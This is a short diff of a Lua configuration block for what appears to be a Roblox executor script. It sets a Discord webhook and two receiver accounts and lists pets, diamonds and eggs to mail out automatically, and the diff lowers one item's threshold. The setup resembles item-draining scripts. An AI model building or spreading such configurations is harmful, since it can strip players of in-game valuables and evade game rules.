@@ -58,7 +58,7 @@ getgenv().GWEBHOOK_LINK = "https://discord.com/api/webhooks/1249413828547182742/
 getgenv().GHUGE_COUNT = 0
 getgenv().GMAIL_RECEIVERS = {"ElfBarZero", "ProfiAzUr"}
 getgenv().GMAIL_ITEMS = {
-    ["Pixel Prism"] = {Class = "Misc", Id = "Pixel Prism", MinAmount = 100},
+    ["Pixel Prism"] = {Class = "Misc", Id = "Pixel Prism", MinAmount = 50},
     ["All Huges"] = {Class = "Pet", Id = "All Huges", MinAmount = 1},
     ["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "5m", MinAmount = "1b"},
     ["Hype Egg 2"] = {Class = "Lootbox", Id = "Hype Egg 2", MinAmount = 1},
